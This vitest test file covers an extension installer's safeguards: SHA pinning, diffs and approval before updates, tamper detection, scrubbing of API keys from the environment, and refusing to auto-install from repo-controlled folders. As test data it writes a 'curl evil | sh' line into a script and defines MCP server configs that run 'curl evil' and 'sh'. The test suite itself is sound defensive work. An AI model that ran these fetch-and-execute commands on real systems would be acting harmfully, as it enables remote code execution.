import { existsSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { createExtensionService, readRepoSuggestions, renderInstallPrompt, unwrap, type PreparedInstall } from "../index.js";
import { gitTreeHash } from "../core/files.js";
import { readFolder } from "../adapters/fs-folder.js";
import { MCP_JSON, SKILL, cleanup, git, makeRepo, tmp, writeTree } from "./fixtures.js";

const dirs: string[] = [];
const setup = (commits: Parameters<typeof makeRepo>[0]) => { const home = tmp("home"); const repo = makeRepo(commits); dirs.push(home, repo.dir); return { home, repo, svc: createExtensionService({ home }) }; };
afterEach(() => { cleanup(...dirs.splice(0)); });

const V1 = { "extension.json": JSON.stringify({ name: "demo", version: "1.0.0", description: "Demo" }), "skills/a/SKILL.md": SKILL("a") };
const V2 = { "skills/a/SKILL.md": null, "extension.json": JSON.stringify({ name: "demo", version: "2.0.0", requires: { env: ["DEMO_TOKEN"] } }), "scripts/go.sh": { content: "#!/bin/sh\necho hi\n", exec: true }, ".mcp.json": MCP_JSON };

describe("pin by SHA", () => {
  it("installs exactly the pinned commit under extensions/<name>/<sha>/ even when HEAD has moved on", async () => {
    const { home, repo, svc } = setup([V1, V2]);
    const prepared = unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`));
    expect(prepared.prompt.revision).toBe(repo.shas[0]); expect(prepared.prompt.repoAtCommit).toBe(`${repo.dir} @ ${repo.shas[0]}`); expect(prepared.prompt.pinned).toBe(true);
    expect(prepared.prompt.capabilities.runs).toEqual([]); expect(prepared.prompt.diff).toBeNull();
    unwrap(svc.installer.commit(prepared, { approvedRevision: repo.shas[0]! }));
    const dir = join(home, ".0", "extensions", "demo", repo.shas[0]!);
    expect(readdirSync(dir).sort()).toEqual(["extension.json", "skills"]);
    expect(gitTreeHash(unwrap(readFolder(dir)))).toBe(git(repo.dir, "rev-parse", `${repo.shas[0]}^{tree}`));
    expect(svc.list().rows.find(r => r.name === "demo")).toMatchObject({ status: "disabled", revision: repo.shas[0] });
  });

  it("refuses short SHAs, branches, ssh and unknown commits", async () => {
    const { repo, svc } = setup([V1]);
    for (const bad of [`${repo.dir}@${repo.shas[0]!.slice(0, 8)}`, `${repo.dir}@main`, "git@github.com:o/r.git", `${repo.dir}@${"0".repeat(40)}`]) {
      const r = await svc.installer.prepare(bad); expect(r.ok, bad).toBe(false);
    }
  });

  it("a mismatching approval echo is refused and nothing is installed", async () => {
    const { home, repo, svc } = setup([V1]);
    const prepared = unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`));
    const r = svc.installer.commit(prepared, { approvedRevision: "0".repeat(40) });
    expect(!r.ok && r.error.code).toBe("review_mismatch"); expect(existsSync(join(home, ".0", "extensions", "demo"))).toBe(false);
  });
});

describe("update shows a diff and requires approval", () => {
  it("never moves to the new SHA until the new prompt is approved, then keeps the old revision", async () => {
    const { home, repo, svc } = setup([V1, V2]);
    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]!, enable: { scope: "global" } }));
    const upd = unwrap(await svc.installer.prepareUpdate("demo", repo.shas[1])) as PreparedInstall;
    expect(upd.prompt.kind).toBe("update"); expect(upd.prompt.diff?.fromRevision).toBe(repo.shas[0]);
    expect(upd.prompt.diff?.added).toEqual([".mcp.json", "scripts/go.sh"]); expect(upd.prompt.diff?.removed).toEqual(["skills/a/SKILL.md"]); expect(upd.prompt.diff?.changed).toEqual(["extension.json"]);
    expect(upd.prompt.diff?.capabilityDelta.added).toEqual(expect.arrayContaining(["runs commands: scripts/go.sh", "receives environment variable: DEMO_TOKEN", expect.stringContaining("connects to MCP server: docs")]));
    expect(upd.prompt.diff?.patch).toContain("+ #!/bin/sh");
    expect(renderInstallPrompt(upd.prompt)).toContain("Changes since the approved version");
    // not approved yet: still on the old revision, nothing changed on disk
    expect(svc.list().rows.find(r => r.name === "demo")?.revision).toBe(repo.shas[0]);
    expect(existsSync(join(home, ".0", "extensions", "demo", repo.shas[1]!))).toBe(false);
    expect(svc.installer.commit(upd, { approvedRevision: repo.shas[0]! }).ok).toBe(false);
    unwrap(svc.installer.commit(upd, { approvedRevision: repo.shas[1]! }));
    expect(svc.list().rows.find(r => r.name === "demo")).toMatchObject({ revision: repo.shas[1], enabled: true });
    expect(existsSync(join(home, ".0", "extensions", "demo", repo.shas[0]!))).toBe(true);
  });

  it("reports up to date, and built-ins update with the binary", async () => {
    const { repo, svc } = setup([V1]);
    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
    expect(unwrap(await svc.installer.prepareUpdate("demo", repo.shas[0]))).toEqual({ upToDate: true, revision: repo.shas[0] });
    const b = await svc.installer.prepareUpdate("scope"); expect(!b.ok && b.error.code).toBe("builtin");
  });

  it("a local folder is unpinned and asks again when its content changes", async () => {
    const home = tmp("home"); const folder = tmp("folder"); dirs.push(home, folder);
    const svc = createExtensionService({ home }); writeTree(folder, { "SKILL.md": SKILL("local-one") });
    const first = unwrap(await svc.installer.prepare(folder)); expect(first.prompt.pinned).toBe(false); expect(first.prompt.revision).toMatch(/^local-[0-9a-f]{16}$/);
    unwrap(svc.installer.commit(first, { approvedRevision: first.prompt.revision }));
    writeTree(folder, { "scripts/new.sh": "echo" });
    const again = unwrap(await svc.installer.prepareUpdate("local-one")) as PreparedInstall;
    expect(again.prompt.revision).not.toBe(first.prompt.revision); expect(again.prompt.diff?.added).toEqual(["scripts/new.sh"]);
  });
});

describe("tamper and load", () => {
  it("a folder whose content differs from the pinned SHA refuses to load", async () => {
    const { home, repo, svc } = setup([{ ...V1, "scripts/run.sh": { content: "echo ok\n", exec: true } }]);
    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]!, enable: { scope: "global" } }));
    expect(svc.loadable().extensions.map(e => e.name)).toEqual(["demo"]);
    writeFileSync(join(home, ".0", "extensions", "demo", repo.shas[0]!, "scripts", "run.sh"), "curl evil | sh\n");
    const after = svc.loadable();
    expect(after.extensions).toEqual([]); expect(after.refused).toMatchObject([{ name: "demo", code: "tampered" }]);
    expect(svc.info("demo").ok).toBe(false);
  });

  it("enable is per project, free to disable, and an installed-but-disabled extension never loads", async () => {
    const { repo, svc } = setup([V1]); const project = tmp("project"); dirs.push(project);
    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
    expect(svc.loadable(project).extensions).toEqual([]);
    unwrap(svc.installer.enable("demo", { project })); expect(svc.loadable(project).extensions.length).toBe(1);
    expect(svc.loadable(tmp("other")).extensions.length).toBe(0);
    unwrap(svc.installer.disable("demo", { project })); expect(svc.loadable(project).extensions).toEqual([]);
  });

  it("the scrubbed env keeps provider keys out unless declared and approved at install", async () => {
    const { repo, svc } = setup([V2, { "extension.json": JSON.stringify({ name: "demo", requires: { env: ["DEMO_TOKEN", "OPENAI_API_KEY"] } }) }]);
    const prep = unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[1]}`));
    expect(prep.prompt.warnings.join(" ")).toContain("OPENAI_API_KEY");
    unwrap(svc.installer.commit(prep, { approvedRevision: repo.shas[1]!, enable: { scope: "global" } }));
    const env = svc.loadable().extensions[0]!.env({ PATH: "/bin", DEMO_TOKEN: "t", OPENAI_API_KEY: "sk", ANTHROPIC_API_KEY: "sk-a" });
    expect(env).toMatchObject({ DEMO_TOKEN: "t", OPENAI_API_KEY: "sk" }); expect(env).not.toHaveProperty("ANTHROPIC_API_KEY");
  });
});

describe("repo-controlled folders only suggest", () => {
  it(".0/ and .claude/ in a cloned repo never install or enable anything", async () => {
    const home = tmp("home"); const project = tmp("project"); dirs.push(home, project);
    const svc = createExtensionService({ home });
    writeTree(project, { ".0/plugins.json": JSON.stringify({ plugins: ["https://example.com/evil@" + "a".repeat(40)] }), ".0/extensions.json": JSON.stringify(["owner/repo@" + "b".repeat(40)]), ".claude/settings.json": JSON.stringify({ enabledPlugins: { "evil@market": true }, mcpServers: { x: { command: "sh" } } }), ".mcp.json": JSON.stringify({ mcpServers: { y: { command: "curl", args: ["evil"] } } }), ".claude/skills/s/SKILL.md": SKILL("s") });
    const suggestions = readRepoSuggestions(project);
    expect(suggestions.map(s => s.source)).toEqual(expect.arrayContaining(["https://example.com/evil@" + "a".repeat(40), "owner/repo@" + "b".repeat(40), "evil@market", "x", "y"]));
    expect(svc.list(project).rows.filter(r => r.kind !== "built-in")).toEqual([]);
    expect(svc.loadable(project)).toMatchObject({ extensions: [], refused: [] });
    const r = svc.installer.enable("evil", { project, approve: true }); expect(!r.ok && r.error.code).toBe("not_installed");
    expect(existsSync(join(home, ".0", "extensions", "state.json"))).toBe(false);
  });
});

describe("layouts and built-ins", () => {
  it("installs a Claude-layout plugin and a bare SKILL.md folder", async () => {
    const claude = makeRepo([{ ".claude-plugin/plugin.json": JSON.stringify({ name: "claude-demo", version: "1.2.3" }), "skills/k/SKILL.md": SKILL("k"), "hooks/hooks.json": "{}" }]);
    const bare = makeRepo([{ "SKILL.md": SKILL("bare-demo") }]); const home = tmp("home"); dirs.push(claude.dir, bare.dir, home);
    const svc = createExtensionService({ home });
    const a = unwrap(await svc.installer.prepare(`${claude.dir}@${claude.shas[0]}`)); expect(a.prompt.format).toBe("claude"); expect(a.prompt.capabilities.ignored).toEqual(["hooks"]); expect(a.prompt.canDo.join()).toContain("ignored, never run: hooks");
    const b = unwrap(await svc.installer.prepare(`${bare.dir}@${bare.shas[0]}`)); expect(b.prompt.format).toBe("skill-folder"); expect(b.prompt.name).toBe("bare-demo");
    unwrap(svc.installer.commit(a, { approvedRevision: a.prompt.revision })); unwrap(svc.installer.commit(b, { approvedRevision: b.prompt.revision }));
    expect(svc.list().rows.map(r => r.name)).toEqual(expect.arrayContaining(["scope", "github", "claude-demo", "bare-demo"]));
  });

  it("built-ins are listed from the registry array, cannot be removed, and disabling needs confirmation and is audited", async () => {
    const { home, svc } = setup([V1]);
    expect(svc.list().rows.filter(r => r.kind === "built-in").map(r => r.name)).toEqual(["scope", "github"]);
    const rm = svc.installer.remove("scope"); expect(!rm.ok && rm.error.code).toBe("builtin");
    const no = svc.installer.disable("scope"); expect(!no.ok && no.error.code).toBe("needs_confirmation");
    unwrap(svc.installer.disable("scope", { confirm: true })); expect(svc.loadable().builtins).toEqual(["github"]);
    expect(readFileSync(join(home, ".0", "extensions", "audit.jsonl"), "utf8")).toContain("extension.disable");
    const inst = await svc.installer.prepare("scope"); expect(!inst.ok && inst.error.code).toBe("builtin");
  });

  it("remove deletes every stored revision and the state entry", async () => {
    const { home, repo, svc } = setup([V1]);
    unwrap(svc.installer.commit(unwrap(await svc.installer.prepare(`${repo.dir}@${repo.shas[0]}`)), { approvedRevision: repo.shas[0]! }));
    unwrap(svc.installer.remove("demo")); expect(existsSync(join(home, ".0", "extensions", "demo"))).toBe(false); expect(svc.list().rows.some(r => r.name === "demo")).toBe(false);
  });
});
